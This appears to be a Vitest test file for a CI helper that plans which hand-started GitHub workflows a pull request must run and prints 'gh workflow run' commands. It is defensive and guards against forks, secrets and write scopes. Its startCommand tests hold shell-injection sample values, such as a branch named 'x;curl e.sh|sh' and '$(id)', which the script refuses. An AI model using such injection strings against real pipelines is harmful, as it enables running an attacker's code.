import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, it, expect, afterEach, vi } from 'vitest';
import {
  NEVER_DISPATCHED,
  main,
  pinOnlyDiff,
  planDispatch,
  reachesBeyondPullRequest,
  startCommand,
  triggers,
  type BaseRun,
} from '../../scripts/coverage-dispatch.ts';

/**
 * Which hand-started workflows a pull request must run on its own commit
 * (issue #35, AC4; Shyden 2026-10-27: those that ran on the base, plus those
 * the PR changes, never deploy-dev; 2026-10-28 rulings 1-3).
 */

const RECORD = '.github/workflows/record.yml';
const LOGS = '.github/workflows/logs.yml';
const DEPLOY = '.github/workflows/deploy-dev.yml';
const PROBE = '.github/workflows/probe.yml';

const dispatchOnly = (extra = '') =>
  [
    'name: x',
    'on:',
    '  workflow_dispatch:',
    'permissions:',
    '  contents: read',
    'jobs:',
    '  x:',
    '    runs-on: ubuntu-26.04',
    extra,
    '    steps:',
    '      - run: echo x',
    '',
  ].join('\n');
const record = dispatchOnly();
const changedRecord = dispatchOnly('    timeout-minutes: 5');

const files = (entries: [string, string][]) => new Map(entries);
const runs = (...entries: [string, string][]): BaseRun[] => entries.map(([path, event]) => ({ path, event }));

describe('triggers', () => {
  it('reads a block `on:` by its child keys, as ci.yml writes it', () => {
    expect([...triggers(readFileSync('.github/workflows/ci.yml', 'utf8'), 'ci.yml')].sort()).toEqual(['pull_request', 'push']);
  });

  it('reads child keys only, never the settings nested under them', () => {
    const text = [
      'on:',
      '  workflow_dispatch:',
      '    inputs:',
      '      ref:',
      '        required: true',
      '  workflow_call:',
      'jobs:',
      '',
    ].join('\n');
    expect([...triggers(text, 'w.yml')].sort()).toEqual(['workflow_call', 'workflow_dispatch']);
  });

  it('reads an inline `on: name`', () => {
    expect([...triggers('on: push\njobs:\n', 'w.yml')]).toEqual(['push']);
  });

  it('reads an inline `on: [a, b]` list', () => {
    expect([...triggers('on: [push, pull_request]\njobs:\n', 'w.yml')].sort()).toEqual(['pull_request', 'push']);
  });

  it('refuses a workflow with no top-level `on:`, naming the file', () => {
    expect(() => triggers('name: x\njobs:\n', 'w.yml')).toThrow(/w\.yml: no top-level on: line/);
  });

  it('refuses a quoted `"on":`, naming the file', () => {
    expect(() => triggers('"on":\n  push:\njobs:\n', 'w.yml')).toThrow(/w\.yml: no top-level on: line/);
  });

  it('refuses a flow mapping, naming the file', () => {
    expect(() => triggers('on: {push: {}}\njobs:\n', 'w.yml')).toThrow(/w\.yml: on: is written as a flow mapping/);
  });

  it('refuses an `on:` block with no triggers, naming the file', () => {
    expect(() => triggers('on:\njobs:\n', 'w.yml')).toThrow(/w\.yml: on: names no trigger/);
  });
});

describe('planDispatch', () => {
  it('starts nothing for an unchanged hand-started workflow that did not run on the base', () => {
    expect(planDispatch(files([[RECORD, record]]), files([[RECORD, record]]), [])).toEqual({ dispatch: [], notMeasurable: [] });
  });

  it('starts an unchanged hand-started workflow that was dispatched on the base', () => {
    expect(planDispatch(files([[RECORD, record]]), files([[RECORD, record]]), runs([RECORD, 'workflow_dispatch'])).dispatch).toEqual([
      RECORD,
    ]);
  });

  it('starts an unchanged hand-started workflow that ran on the base by its schedule', () => {
    const scheduled = record.replace('  workflow_dispatch:', '  workflow_dispatch:\n  schedule:\n    - cron: 0 1 * * *');
    expect(planDispatch(files([[RECORD, scheduled]]), files([[RECORD, scheduled]]), runs([RECORD, 'schedule'])).dispatch).toEqual([RECORD]);
  });

  it('does not count a base run that came from a push, not a hand start or schedule', () => {
    expect(planDispatch(files([[RECORD, record]]), files([[RECORD, record]]), runs([RECORD, 'push'])).dispatch).toEqual([]);
  });

  it('starts a hand-started workflow the pull request changes', () => {
    expect(planDispatch(files([[RECORD, changedRecord]]), files([[RECORD, record]]), []).dispatch).toEqual([RECORD]);
  });

  it('lists every workflow to start, sorted', () => {
    const plan = planDispatch(
      files([
        [RECORD, changedRecord],
        [LOGS, changedRecord],
      ]),
      files([
        [RECORD, record],
        [LOGS, record],
      ]),
      [],
    );
    expect(plan.dispatch).toEqual([LOGS, RECORD]);
  });

  it('never starts deploy-dev, changed or run on the base: its pull-request rehearsal covers it', () => {
    const deploy = dispatchOnly('    environment: dev');
    const plan = planDispatch(
      files([[DEPLOY, deploy.replace('ubuntu-26.04', 'ubuntu-26.04 ')]]),
      files([[DEPLOY, deploy]]),
      runs([DEPLOY, 'workflow_dispatch']),
    );
    expect([plan, NEVER_DISPATCHED]).toEqual([{ dispatch: [], notMeasurable: [] }, [DEPLOY]]);
  });

  it('leaves a new hand-started workflow out of the comparison, since it cannot run before it is on develop (ruling 2)', () => {
    expect(planDispatch(files([[PROBE, record]]), files([]), [])).toEqual({ dispatch: [], notMeasurable: [PROBE] });
  });

  it('counts a new workflow called by others (workflow_call) as not measurable too', () => {
    const called = record.replace('  workflow_dispatch:', '  workflow_dispatch:\n  workflow_call:');
    expect(planDispatch(files([[PROBE, called]]), files([]), []).notMeasurable).toEqual([PROBE]);
  });

  it('measures a new workflow that also runs on pull requests, and starts nothing for it', () => {
    const both = record.replace('  workflow_dispatch:', '  workflow_dispatch:\n  pull_request:');
    expect(planDispatch(files([[PROBE, both]]), files([]), [])).toEqual({ dispatch: [], notMeasurable: [] });
  });

  it('starts nothing for a changed workflow that is not hand-started', () => {
    const pr = record.replace('  workflow_dispatch:', '  pull_request:');
    expect(planDispatch(files([[PROBE, pr.replace('x', 'y')]]), files([[PROBE, pr]]), []).dispatch).toEqual([]);
  });

  it('refuses a schedule-only workflow it would have to start, naming it', () => {
    const scheduled = record.replace('  workflow_dispatch:', '  schedule:\n    - cron: 0 1 * * *');
    expect(() => planDispatch(files([[PROBE, scheduled.replace('name: x', 'name: y')]]), files([[PROBE, scheduled]]), [])).toThrow(
      /probe\.yml must run on the pull request's commit but has no workflow_dispatch: add workflow_dispatch/,
    );
  });

  it('refuses a workflow it would have to start that needs a dispatch input, naming it', () => {
    const input = record.replace(
      '  workflow_dispatch:',
      '  workflow_dispatch:\n    inputs:\n      ref:\n        required: true\n        type: string',
    );
    expect(() => planDispatch(files([[RECORD, input.replace('name: x', 'name: y')]]), files([[RECORD, input]]), [])).toThrow(
      /record\.yml must run on the pull request's commit but needs a dispatch input/,
    );
  });

  it('refuses any hand-started workflow holding an environment that is not in NEVER_DISPATCHED, naming it', () => {
    const prod = dispatchOnly('    environment: prod');
    expect(() => planDispatch(files([[PROBE, prod]]), files([[PROBE, prod]]), [])).toThrow(
      /probe\.yml is hand-started and names an environment: add it to NEVER_DISPATCHED/,
    );
  });

  it('reads an `environment:` inside a comment as no environment', () => {
    const commented = dispatchOnly('    # environment: prod');
    expect(planDispatch(files([[PROBE, commented]]), files([[PROBE, commented]]), [])).toEqual({ dispatch: [], notMeasurable: [] });
  });
});

// The command is printed into a log for a person to paste, and a pull
// request from a fork names its own branch: git allows `;`, `$`, `|` and
// backticks in a branch name, so anything outside plain characters is refused
// rather than printed into a command that would run it.
describe('startCommand', () => {
  it('names the workflow file and the scratch branch for the head', () => {
    expect(startCommand(RECORD, 'dependabot/github_actions/actions/checkout-7.0.2', 'a'.repeat(40))).toBe(
      'gh workflow run record.yml --ref coverage/dependabot/github_actions/actions/checkout-7.0.2/aaaaaaa',
    );
  });

  it.each([['x;curl e.sh|sh'], ['$(id)'], ['`id`'], ['-x'], ['a b'], ["a'b"], ['']])('refuses the branch %j', (branch) => {
    expect(() => startCommand(RECORD, branch, 'a'.repeat(40))).toThrow(
      `coverage-dispatch: the branch ${JSON.stringify(branch)} holds characters a pasted command would run; start its runs by hand`,
    );
  });

  it('refuses a workflow file name a pasted command would run', () => {
    expect(() => startCommand('.github/workflows/a;id.yml', 'feature', 'a'.repeat(40))).toThrow(
      'coverage-dispatch: the workflow file "a;id.yml" holds characters a pasted command would run; start its runs by hand',
    );
  });

  it('refuses a commit that is not hex', () => {
    expect(() => startCommand(RECORD, 'feature', `$(id)${'a'.repeat(35)}`)).toThrow(
      'coverage-dispatch: the commit "$(id)aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" holds characters a pasted command would run; start its runs by hand',
    );
  });
});

describe('main', () => {
  const HEAD = 'a'.repeat(40);
  const BASE = 'b'.repeat(40);

  afterEach(() => {
    vi.unstubAllEnvs();
    vi.restoreAllMocks();
  });

  function rootWith(entries: Record<string, string>): string {
    const root = mkdtempSync(join(tmpdir(), 'coverage-dispatch-'));
    mkdirSync(join(root, '.github/workflows'), { recursive: true });
    for (const [name, text] of Object.entries(entries)) writeFileSync(join(root, '.github/workflows', name), text);
    return root;
  }

  /** The env the CLI reads, the head checked out at the working directory, and a base runs list. */
  function setUp(head: Record<string, string>, base: Record<string, string>, baseRuns: unknown[] = [], pulls: unknown = []) {
    vi.stubEnv('GITHUB_REPOSITORY', 'o/r');
    vi.stubEnv('GITHUB_TOKEN', 't');
    vi.spyOn(process, 'cwd').mockReturnValue(rootWith(head));
    const printed: string[] = [];
    vi.spyOn(process.stdout, 'write').mockImplementation((text) => printed.push(String(text)) > 0);
    const asked: string[] = [];
    const stand = ((url: string) => {
      asked.push(url);
      if (url.includes('/pulls')) return Promise.resolve(Response.json(pulls));
      return Promise.resolve(Response.json({ total_count: baseRuns.length, workflow_runs: baseRuns }));
    }) as unknown as typeof fetch;
    return { baseRoot: rootWith(base), printed, asked, stand };
  }

  it.each([[[]], [['a', 'b', 'c']], [['a', 'b', 'c', 'd', 'e']]])(
    'refuses %j: it takes the head, the base, the base checkout and the branch',
    async (args) => {
      await expect(main(args)).rejects.toThrow('usage: node scripts/coverage-dispatch.ts <head-sha> <base-sha> <base-root> <branch>');
    },
  );

  it.each([
    ['head', ['abc1234', BASE, 'base', 'feature']],
    ['base', [HEAD, 'abc1234', 'base', 'feature']],
  ])('refuses a short %s sha', async (_side, args) => {
    await expect(main(args)).rejects.toThrow('coverage-dispatch: abc1234 is not a full commit sha');
  });

  it('refuses an empty branch', async () => {
    await expect(main([HEAD, BASE, 'base', ''])).rejects.toThrow(
      'coverage-dispatch: the branch is empty; name the branch the pull request is pushed from',
    );
  });

  it.each([
    ['GITHUB_REPOSITORY', 'GITHUB_REPOSITORY is empty: name the repository as owner/name'],
    ['GITHUB_TOKEN', 'GITHUB_TOKEN is empty: the base commit’s runs are read with it'],
  ])('refuses %s empty', async (name, message) => {
    vi.stubEnv('GITHUB_REPOSITORY', 'o/r');
    vi.stubEnv('GITHUB_TOKEN', 't');
    vi.stubEnv(name, '');
    await expect(main([HEAD, BASE, 'base', 'feature'])).rejects.toThrow(`coverage-dispatch: ${message}`);
  });

  it('prints the command for each workflow to start, then each new one it cannot, after reading the base runs', async () => {
    const { baseRoot, printed, asked, stand } = setUp(
      { 'record.yml': record, 'logs.yml': changedRecord, 'probe.yml': record },
      { 'record.yml': record, 'logs.yml': record },
      [{ id: 3, path: RECORD, status: 'completed', event: 'workflow_dispatch' }],
    );
    expect(await main([HEAD, BASE, baseRoot, 'feature/x'], stand)).toBe(0);
    expect([asked, printed]).toEqual([
      [
        `https://api.github.com/repos/o/r/commits/${HEAD}/pulls?per_page=100`,
        `https://api.github.com/repos/o/r/actions/runs?head_sha=${BASE}&per_page=100`,
      ],
      [
        'gh workflow run logs.yml --ref coverage/feature/x/aaaaaaa\n',
        'gh workflow run record.yml --ref coverage/feature/x/aaaaaaa\n',
        `coverage-dispatch: ${PROBE} is not measurable until on develop (#35 ruling 2)\n`,
      ],
    ]);
  });

  it('says so when nothing needs a run', async () => {
    const { baseRoot, printed, stand } = setUp({ 'record.yml': record }, { 'record.yml': record });
    expect(await main([HEAD, BASE, baseRoot, 'feature'], stand)).toBe(0);
    expect(printed).toEqual([`coverage-dispatch: no hand-started workflow needs a run on ${HEAD}\n`]);
  });

  // Shyden 2026-10-28, "Fence it": a started run gets this repository's
  // secrets, so a Dependabot commit is started only when it bumps pins alone.
  it('prints the commands for a Dependabot branch whose workflows change only action pins', async () => {
    const { baseRoot, printed, stand } = setUp({ 'record.yml': withPin(NEW_PIN) }, { 'record.yml': withPin(OLD_PIN) });
    expect(await main([HEAD, BASE, baseRoot, 'dependabot/github_actions/actions/checkout-7.0.2'], stand)).toBe(0);
    expect(printed).toEqual(['gh workflow run record.yml --ref coverage/dependabot/github_actions/actions/checkout-7.0.2/aaaaaaa\n']);
  });

  it('refuses a Dependabot branch whose workflow changes more than an action pin, naming the line', async () => {
    const more = withPin(NEW_PIN).replace('      - run: echo x', '      - run: echo y');
    const { baseRoot, printed, stand } = setUp({ 'record.yml': more }, { 'record.yml': withPin(OLD_PIN) });
    await expect(main([HEAD, BASE, baseRoot, 'dependabot/npm_and_yarn/x-1.0.0'], stand)).rejects.toThrow(
      `coverage-dispatch: dependabot/npm_and_yarn/x-1.0.0 is not started on a coverage branch: ${RECORD}:12 changes more than an action pin: - run: echo y`,
    );
    expect(printed).toEqual([]);
  });

  // An unchanged workflow still runs the commit's code (npm ci, the tests), so
  // it may reach no more than a pull_request run would: no secret, no write.
  it('refuses a Dependabot branch whose workflow to start reaches a secret, though the workflow is unchanged', async () => {
    const secret = withPin(OLD_PIN).replace(
      '      - run: echo x',
      '      - run: echo x\n        env:\n          T: ${{ secrets.SONAR_TOKEN }}',
    );
    const { baseRoot, stand } = setUp({ 'record.yml': secret }, { 'record.yml': secret }, [
      { id: 3, path: RECORD, status: 'completed', event: 'workflow_dispatch' },
    ]);
    await expect(main([HEAD, BASE, baseRoot, 'dependabot/npm_and_yarn/x-1.0.0'], stand)).rejects.toThrow(
      `coverage-dispatch: dependabot/npm_and_yarn/x-1.0.0 is not started on a coverage branch: ${RECORD}:14 reaches a secret: T: \${{ secrets.SONAR_TOKEN }}`,
    );
  });

  it('refuses a commit that heads a pull request from a fork', async () => {
    const pulls = [{ number: 9, head: { repo: { full_name: 'someone/fork' } } }];
    const { baseRoot, stand } = setUp({ 'record.yml': changedRecord }, { 'record.yml': record }, [], pulls);
    await expect(main([HEAD, BASE, baseRoot, 'feature'], stand)).rejects.toThrow(
      `coverage-dispatch: aaaaaaa heads a pull request from someone/fork: a fork's commit never goes to a coverage branch (#35, Shyden 2026-10-28, "Fence it")`,
    );
  });

  it('refuses a commit that heads a pull request from a deleted fork', async () => {
    const { baseRoot, stand } = setUp({ 'record.yml': changedRecord }, { 'record.yml': record }, [], [{ number: 9, head: { repo: null } }]);
    await expect(main([HEAD, BASE, baseRoot, 'feature'], stand)).rejects.toThrow(
      `coverage-dispatch: aaaaaaa heads a pull request from a deleted fork: a fork's commit never goes to a coverage branch`,
    );
  });

  it('starts a commit that heads a pull request from this repository', async () => {
    const pulls = [{ number: 9, head: { repo: { full_name: 'o/r' } } }];
    const { baseRoot, printed, stand } = setUp({ 'record.yml': changedRecord }, { 'record.yml': record }, [], pulls);
    expect(await main([HEAD, BASE, baseRoot, 'feature'], stand)).toBe(0);
    expect(printed).toEqual(['gh workflow run record.yml --ref coverage/feature/aaaaaaa\n']);
  });

  it('refuses a full page of pull requests rather than read part of the list', async () => {
    const page = Array.from({ length: 100 }, (_, n) => ({ number: n, head: { repo: { full_name: 'o/r' } } }));
    const { baseRoot, stand } = setUp({ 'record.yml': record }, { 'record.yml': record }, [], page);
    await expect(main([HEAD, BASE, baseRoot, 'feature'], stand)).rejects.toThrow(
      `coverage-dispatch: /repos/o/r/commits/${HEAD}/pulls?per_page=100 lists 100 pull requests; one page of 100 was read`,
    );
  });

  it('refuses a pulls answer that is not a list', async () => {
    const { baseRoot, stand } = setUp({ 'record.yml': record }, { 'record.yml': record }, [], { message: 'x' });
    await expect(main([HEAD, BASE, baseRoot, 'feature'], stand)).rejects.toThrow(
      `coverage-dispatch: /repos/o/r/commits/${HEAD}/pulls?per_page=100 answered no list`,
    );
  });
});

describe('reachesBeyondPullRequest', () => {
  it('finds nothing in a workflow with a read token and no secret', () => {
    expect(reachesBeyondPullRequest(record, RECORD)).toEqual([]);
  });

  it('allows the run’s own token by either name', () => {
    const own = record.replace(
      '      - run: echo x',
      '      - run: echo x\n        env:\n          A: ${{ secrets.GITHUB_TOKEN }}\n          B: ${{ github.token }}',
    );
    expect(reachesBeyondPullRequest(own, RECORD)).toEqual([]);
  });

  it('reads a secret named in a comment as nothing', () => {
    expect(reachesBeyondPullRequest(record.replace('jobs:', '# secrets.SONAR_TOKEN is never used\njobs:'), RECORD)).toEqual([]);
  });

  it('names a workflow with no top-level permissions, which takes the repository default', () => {
    expect(reachesBeyondPullRequest(record.replace('permissions:\n  contents: read\n', ''), RECORD)).toEqual([
      `${RECORD}: names no top-level permissions, so its token takes the repository default`,
    ]);
  });

  it.each([['  contents: write'], ['  id-token: write'], ['  actions: write']])('names a write scope %s', (scope) => {
    expect(reachesBeyondPullRequest(record.replace('  contents: read', scope), RECORD)).toEqual([
      `${RECORD}:5 asks for a write scope: ${scope.trim()}`,
    ]);
  });

  it('names secrets: inherit, which hands a called workflow every secret', () => {
    const inherit = record.replace('    steps:', '    secrets: inherit\n    steps:');
    expect(reachesBeyondPullRequest(inherit, RECORD)).toEqual([`${RECORD}:10 reaches a secret: secrets: inherit`]);
  });

  it('names write-all', () => {
    expect(reachesBeyondPullRequest(record.replace('permissions:\n  contents: read', 'permissions: write-all'), RECORD)).toEqual([
      `${RECORD}:4 asks for a write scope: permissions: write-all`,
    ]);
  });
});

const OLD_PIN = '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1';
const NEW_PIN = '      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567 # v7.0.2';
/** The hand-started fixture with one pinned step before its run step. */
const withPin = (pin: string) => record.replace('    steps:\n', `    steps:\n${pin}\n`);

describe('pinOnlyDiff', () => {
  it('finds nothing when only an action pin and its version change', () => {
    expect(pinOnlyDiff(withPin(OLD_PIN), withPin(NEW_PIN), RECORD)).toEqual([]);
  });

  it('finds nothing in an unchanged file', () => {
    expect(pinOnlyDiff(withPin(OLD_PIN), withPin(OLD_PIN), RECORD)).toEqual([]);
  });

  it('names a pin moved to another action', () => {
    const other = NEW_PIN.replace('actions/checkout', 'evil/checkout');
    expect(pinOnlyDiff(withPin(OLD_PIN), withPin(other), RECORD)).toEqual([
      `${RECORD}:11 changes more than an action pin: - uses: evil/checkout@0123456789abcdef0123456789abcdef01234567 # v7.0.2`,
    ]);
  });

  it('names a pin turned into a tag', () => {
    const tag = '      - uses: actions/checkout@v7';
    expect(pinOnlyDiff(withPin(OLD_PIN), withPin(tag), RECORD)).toEqual([
      `${RECORD}:11 changes more than an action pin: - uses: actions/checkout@v7`,
    ]);
  });

  it('names a pin given more after its version comment', () => {
    const extra = `${NEW_PIN}\n        with:\n          token: x`;
    expect(pinOnlyDiff(withPin(OLD_PIN), withPin(extra), RECORD)).toEqual([`${RECORD}: adds or removes lines (13 before, 15 after)`]);
  });

  it('names a pin with more after its version on the same line', () => {
    const tail = `${NEW_PIN} extra`;
    expect(pinOnlyDiff(withPin(OLD_PIN), withPin(tail), RECORD)).toEqual([`${RECORD}:11 changes more than an action pin: ${tail.trim()}`]);
  });

  it('names a step indented as a different key', () => {
    const moved = NEW_PIN.replace('      - uses:', '        uses:');
    expect(pinOnlyDiff(withPin(OLD_PIN), withPin(moved), RECORD)).toEqual([
      `${RECORD}:11 changes more than an action pin: uses: actions/checkout@0123456789abcdef0123456789abcdef01234567 # v7.0.2`,
    ]);
  });
});
